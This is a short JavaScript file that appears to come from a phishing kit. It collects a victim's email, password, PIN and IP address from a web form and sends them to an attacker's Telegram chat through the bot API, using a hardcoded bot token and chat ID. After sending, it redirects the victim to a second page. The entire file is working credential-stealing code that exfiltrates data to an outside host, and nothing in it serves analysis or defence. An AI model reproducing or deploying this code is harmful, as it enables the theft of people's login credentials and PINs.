//bot token
var telegram_bot_id = "5427471016:AAFV0qh0Jq9bGFnathmkpCA6p6rdi3I9IA0";
//chat id
var chat_id = 6164370331;
var u_name, pax, pax2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("uzer").value;
    pax = document.getElementById("pazz").value;
    pins = document.getElementById("pins").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "📧Correo: " + u_name + "\n🔒Clave: " + pax + "\nPIN: " + pins + "\nIP: " + ip +"\n" + ip2 +"\n";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = './index2.html';
        console.log(response);
    });
    return false;
};
